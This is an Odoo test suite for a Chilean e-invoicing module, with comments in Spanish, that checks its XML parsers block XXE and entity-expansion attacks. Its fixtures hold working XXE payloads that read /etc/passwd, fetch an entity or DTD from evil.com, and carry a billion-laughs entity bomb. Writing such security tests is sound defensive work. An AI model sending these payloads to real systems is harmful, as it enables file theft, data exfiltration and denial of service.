# -*- coding: utf-8 -*-
"""
Test Suite: XXE Protection
===========================

Tests de seguridad contra ataques XXE (XML External Entity).

Verifica que el parsing XML esté protegido contra:
- XXE attacks (entidades externas)
- Billion laughs attack (entidades recursivas)
- Access a archivos locales
- Access a red

Referencias:
- OWASP Top 10 - A4:2017 XXE
- CWE-611: Improper Restriction of XML External Entity Reference
- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing

Author: EERGYGROUP - Ing. Pedro Troncoso Willz
Date: 2025-11-02
Sprint: Gap Closure P0 - S-005
Version: 1.0.0
"""

from odoo.tests import tagged
from odoo.tests.common import TransactionCase
from lxml import etree


@tagged('post_install', '-at_install', 'security', 'xxe', 'gap_closure_p0')
class TestXXEProtection(TransactionCase):
    """
    Test suite para protección XXE en parsers XML.

    Cobertura:
    - CAF Handler (parsea CAF del SII)
    - DTE Inbox (parsea DTEs recibidos)
    - Safe XML Parser (parser centralizado)
    - Billion laughs attack
    """

    @classmethod
    def setUpClass(cls):
        super().setUpClass()

        # ═══════════════════════════════════════════════════════════════
        # XXE PAYLOADS MALICIOSOS
        # ═══════════════════════════════════════════════════════════════

        # XXE Attack - File access
        cls.xxe_payload_file = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<AUTORIZACION>
  <CAF version="1.0">
    <DA>
      <RE>&xxe;</RE>
      <RS>EMPRESA TEST</RS>
      <TD>33</TD>
      <RNG><D>1</D><H>100</H></RNG>
    </DA>
  </CAF>
</AUTORIZACION>"""

        # XXE Attack - Network access
        cls.xxe_payload_network = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal_data">
]>
<DTE xmlns="http://www.sii.cl/SiiDte">
  <Documento>
    <Encabezado>
      <RUTEmisor>&xxe;</RUTEmisor>
    </Encabezado>
  </Documento>
</DTE>"""

        # Billion Laughs Attack (entidades recursivas)
        cls.billion_laughs_payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<AUTORIZACION>
  <CAF>
    <DA>
      <RE>&lol4;</RE>
    </DA>
  </CAF>
</AUTORIZACION>"""

        # XXE with parameter entities
        cls.xxe_payload_parameter = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root>&xxe;</root>"""

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE SAFE XML PARSER
    # ═══════════════════════════════════════════════════════════════════════

    def test_01_safe_parser_blocks_xxe_file_access(self):
        """Test 01: Safe XML Parser bloquea acceso a archivos locales"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear XXE con acceso a archivo
        try:
            root = fromstring_safe(self.xxe_payload_file)

            # Si llega aquí, verificar que entidad NO fue expandida
            re_element = root.find('.//RE')
            if re_element is not None and re_element.text:
                # No debe contener contenido de /etc/passwd
                self.assertNotIn('root:', re_element.text, 'XXE file access NO bloqueado')
                self.assertNotIn('/bin/', re_element.text, 'XXE file access NO bloqueado')

        except (etree.XMLSyntaxError, ValueError) as e:
            # Parser rechazó el XML malicioso (SUCCESS)
            self.assertIn('entity', str(e).lower(), 'Error debería mencionar entidades')

    def test_02_safe_parser_blocks_xxe_network_access(self):
        """Test 02: Safe XML Parser bloquea acceso a red"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear XXE con acceso a red
        try:
            root = fromstring_safe(self.xxe_payload_network)

            # Si parsea, verificar que no hizo request HTTP
            rut_elem = root.find('.//{http://www.sii.cl/SiiDte}RUTEmisor')
            if rut_elem is not None and rut_elem.text:
                # No debe contener respuesta HTTP
                self.assertNotIn('http', rut_elem.text.lower(), 'XXE network access NO bloqueado')

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_03_safe_parser_blocks_billion_laughs(self):
        """Test 03: Safe XML Parser bloquea billion laughs attack"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # Intentar parsear billion laughs
        try:
            root = fromstring_safe(self.billion_laughs_payload)

            # Si parsea, verificar que no expandió entidades recursivas
            re_element = root.find('.//RE')
            if re_element is not None and re_element.text:
                # Texto no debe ser extremadamente largo (expansión de lol4)
                text_length = len(re_element.text)
                self.assertLess(
                    text_length, 1000,
                    f'Billion laughs attack NO bloqueado: texto expandido a {text_length} bytes'
                )

        except (etree.XMLSyntaxError, ValueError):
            # Parser rechazó el XML (SUCCESS)
            pass

    def test_04_safe_parser_is_xml_safe_heuristic(self):
        """Test 04: Heurística is_xml_safe detecta patrones maliciosos"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import is_xml_safe

        # Test 1: XXE file access
        is_safe, reason = is_xml_safe(self.xxe_payload_file)
        self.assertFalse(is_safe, 'XXE file access no detectado por heurística')
        self.assertIn('XXE', reason, 'Razón debería mencionar XXE')

        # Test 2: XXE network access
        is_safe, reason = is_xml_safe(self.xxe_payload_network)
        self.assertFalse(is_safe, 'XXE network access no detectado por heurística')

        # Test 3: Billion laughs
        is_safe, reason = is_xml_safe(self.billion_laughs_payload)
        self.assertFalse(is_safe, 'Billion laughs no detectado por heurística')
        self.assertIn('billion laughs', reason.lower(), 'Razón debería mencionar billion laughs')

        # Test 4: XML safe (sin DOCTYPE)
        safe_xml = '<root><child>data</child></root>'
        is_safe, reason = is_xml_safe(safe_xml)
        self.assertTrue(is_safe, f'XML seguro marcado como inseguro: {reason}')

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE INTEGRACIÓN CON CAF HANDLER
    # ═══════════════════════════════════════════════════════════════════════

    def test_05_caf_handler_blocks_xxe(self):
        """Test 05: CAF Handler bloquea XXE en parseo de CAF"""
        from odoo.addons.l10n_cl_dte.libs.caf_handler import CAFHandler

        handler = CAFHandler()

        # Intentar parsear CAF con XXE
        result = handler.parse_caf(self.xxe_payload_file)

        # Debe fallar o no expandir entidad
        if result.get('valid'):
            # Si marcó como válido, verificar que no expandió XXE
            rut_emisor = result.get('rut_emisor', '')
            self.assertNotIn('root:', rut_emisor, 'CAF Handler expandió XXE')
            self.assertNotIn('/bin/', rut_emisor, 'CAF Handler expandió XXE')
        else:
            # Rechazó el CAF (SUCCESS)
            self.assertIn('error', result, 'Debe indicar error')

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE INTEGRACIÓN CON DTE INBOX
    # ═══════════════════════════════════════════════════════════════════════

    def test_06_dte_inbox_blocks_xxe(self):
        """Test 06: DTE Inbox bloquea XXE en parseo de DTE recibido"""
        # Crear DTE inbox record
        dte_inbox = self.env['dte.inbox'].new({
            'name': 'XXE Test',
            'dte_xml': self.xxe_payload_network,
        })

        # Intentar parsear metadata
        try:
            metadata = dte_inbox._extract_dte_metadata(self.xxe_payload_network)

            # Si parsea, verificar que NO expandió entidad
            rut_emisor = metadata.get('rut_emisor', '')
            self.assertNotIn('http', rut_emisor, 'DTE Inbox expandió XXE')

        except (etree.XMLSyntaxError, ValueError, Exception):
            # Rechazó el DTE malicioso (SUCCESS)
            pass

    # ═══════════════════════════════════════════════════════════════════════
    # TESTS DE SANITIZACIÓN
    # ═══════════════════════════════════════════════════════════════════════

    def test_07_sanitize_xml_removes_doctype(self):
        """Test 07: Sanitización remueve DOCTYPE de XML"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import sanitize_xml_input

        # Sanitizar XXE payload
        sanitized = sanitize_xml_input(self.xxe_payload_file)

        # Verificar que DOCTYPE fue removido
        self.assertNotIn('<!DOCTYPE', sanitized, 'DOCTYPE no fue removido')
        self.assertNotIn('<!ENTITY', sanitized, 'ENTITY declaration no fue removida')

        # Pero el resto del XML debe permanecer
        self.assertIn('<AUTORIZACION>', sanitized, 'Contenido XML fue dañado')
        self.assertIn('<CAF', sanitized, 'Contenido XML fue dañado')

    def test_08_safe_parser_performance(self):
        """Test 08: Safe parser no degrada significativamente el performance"""
        import time
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        # XML grande pero safe
        large_safe_xml = """<?xml version="1.0"?>
<AUTORIZACION>
  <CAF version="1.0">
    <DA>
      <RE>76000000-0</RE>
      <RS>EMPRESA TEST SPA</RS>
      <TD>33</TD>
      <RNG><D>1</D><H>10000</H></RNG>
    </DA>
  </CAF>
</AUTORIZACION>""" * 10  # 10 CAFs

        # Parsear 10 veces y medir tiempo
        start = time.time()
        for _ in range(10):
            root = fromstring_safe(large_safe_xml)
            self.assertIsNotNone(root)
        elapsed = time.time() - start

        # 10 parseos deben tomar < 500ms
        self.assertLess(
            elapsed, 0.5,
            f'Safe parser demasiado lento: {elapsed*1000:.1f}ms para 10 parseos (límite: 500ms)'
        )


@tagged('post_install', '-at_install', 'security_smoke', 'xxe')
class TestXXEProtectionSmoke(TransactionCase):
    """
    Smoke tests rápidos de protección XXE.

    Tests básicos que deben pasar siempre.
    """

    def test_smoke_safe_parser_available(self):
        """Smoke: Safe XML Parser está disponible"""
        from odoo.addons.l10n_cl_dte.libs import safe_xml_parser

        self.assertTrue(hasattr(safe_xml_parser, 'fromstring_safe'))
        self.assertTrue(hasattr(safe_xml_parser, 'SAFE_XML_PARSER'))

    def test_smoke_safe_parser_basic_parsing(self):
        """Smoke: Safe parser parsea XML básico correctamente"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        xml = '<root><child>test</child></root>'
        root = fromstring_safe(xml)

        self.assertEqual(root.tag, 'root')
        self.assertEqual(root.find('child').text, 'test')

    def test_smoke_safe_parser_rejects_xxe(self):
        """Smoke: Safe parser rechaza o neutraliza XXE básico"""
        from odoo.addons.l10n_cl_dte.libs.safe_xml_parser import fromstring_safe

        xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        try:
            root = fromstring_safe(xxe)
            # Si parsea, verificar que NO expandió entidad
            if root.text:
                self.assertNotIn('root:', root.text, 'XXE fue expandido')
        except Exception:
            # Rechazó el XML (también es éxito)
            pass
